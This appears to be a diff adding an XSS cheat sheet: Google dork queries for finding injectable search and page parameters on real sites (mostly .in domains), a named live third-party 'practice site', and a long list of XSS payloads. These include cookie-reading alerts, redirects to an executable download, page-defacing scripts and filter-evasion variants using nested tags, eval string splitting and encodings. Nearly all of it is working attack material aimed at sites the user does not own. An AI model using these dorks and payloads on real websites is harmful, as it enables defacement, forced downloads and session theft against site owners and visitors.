@@ -1,0 +1,118 @@
+XSS dork
+
+Practice Site: https://clemensantikvariat.dk/
+
+
+/?s= site:.in
+/search?q= site:.in
+/index.php?lang= site:.in
+/index.php?page= site:.in
+/search?query= site:.in
+/search?keyword= site:.in
+/search/?q= site:.in
+/connexion?redirect_uri= site:.in
+/?page= site:.in
+/search/?s= site:.in
+/?keywords= site:
+/search/?keyword= site:.in
+/search-results?q=
+inurl:".php?query="
+inurl:".php?searchstring="
+inurl:".php?keyword="
+inurl:".php?file="
+inurl:".php?years="
+inurl:".php?txt="
+page_details.php?menu_id=
+gallery.php?menu_id=
+inurl:".php?tag="
+inurl:".php?max="
+inurl:".php?from="
+inurl:".php?author="
+inurl:".php?pass="
+inurl:".php?feedback="
+
+
+HERE’S A LIST OF XSS DORKS FOR GOOGLE
+XSS Dorks
+XSS Dorks:
+ /?s= site: (any domain name choose) /search?q= 
+site: (any domain name choose) /index.php?lang= 
+site: (any domain name choose) /index.php?page= 
+site: (any domain name choose) /search?query= 
+site: (any domain name choose) /search?keyword= 
+site: (any domain name choose) /search/?q= 
+site: (any domain name choose) /connexion?redirect_uri= 
+site: (any domain name choose) /?page= 
+site: (any domain name choose) /search/?s= 
+site: (any domain name choose) /?keywords= 
+site: /search/?keyword= 
+site: (any domain name choose) /search-results?q= 
+inurl:".php?query=" 
+inurl:".php?searchstring="
+inurl:".php?keyword="
+inurl:".php?file=" 
+inurl:".php?years=" 
+inurl:".php?txt=" page_details.php?menu_id= gallery.php?menu_id= 
+inurl:".php?tag="
+inurl:".php?max=" 
+
+===================================================================
+SCRIPT
+======================
+
+<script>alert("tigerishere")</script>
+
+<script>alert(document.cookie)</script>
+
+<script> window.location.href = "https://www.voidtools.com/Everything-1.4.1.1032.x86-Setup.exe"; </script>
+
+<script>location.href="https://arenawebsecurity.net/diploma-in-cyber-security";</script>
+
+<script>location.href="https://www.youtube.com/watch?v=dQw4w9WgXcQ";</script>
+
+<script>setInterval(() => {document.body.style.transform = "rotate("+(Math.random()*2 - 1)+"deg) translate("+(Math.random()*10 - 5)+"px,"+(Math.random()*10 - 5)+"px)";}, 50);</script>
+
+<style> @keyframes spin{to{transform:rotate(360deg)}} body{animation:spin 2s linear infinite} </style>
+
+<script> alert("Page hacked with XSS 🎨");  document.body.style.background="linear-gradient(45deg, red, yellow)"; </script>
+
+<script>
+speechSynthesis.speak(new SpeechSynthesisUtterance("Hello Students! This is X S S demo!"));
+</script>
+
+
+<img src=x onerror=alert(1)>
+<svg/onload=alert(1)>
+<!-- Evaluation of string -->
+<script>eval('al'+'ert(1)')</script>
+<!-- Nested Tags -->
+<scr<script>ipt>alert(1)</script>
+<!-- Non-standard spacing -->
+<img src = x onerror = alert(1)>
+
+<script>alert(1)</script>
+<img src=x onerror=alert(1)>
+<svg/onload=alert(1)>
+javascript:alert(1)
+"><script>alert(1)</script>
+</script><script>alert(1)</script>
+<body onload=alert(1)>
+<iframe onload=alert(1)>
+<input onfocus=alert(1) autofocus>
+<select onchange=alert(1)>
+<textarea oninput=alert(1)>
+<form onsubmit=alert(1)>
+<details ontoggle=alert(1)>
+<video src=x onerror=alert(1)>
+<audio src=x onerror=alert(1)>
+<isindex type=image src=1 onerror=alert(1)>
+<marquee onstart=alert(1)>
+<object onerror=alert(1)>
+<embed src=javascript:alert(1)>
+<style>@keyframes x{}</style><xss style="animation-name:x" onanimationend="alert(1)"></xss>
+<!--<img src="--><img src=x onerror=alert(1)//">
+%3Cscript%3Ealert(1)%3C%2Fscript%3E
+&lt;script&gt;alert(1)&lt;/script&gt;
+\u003cscript\u003ealert(1)\u003c/script\u003e
+'"><svg/onload=alert(1)>
+javascript://%250Aalert(1)//  
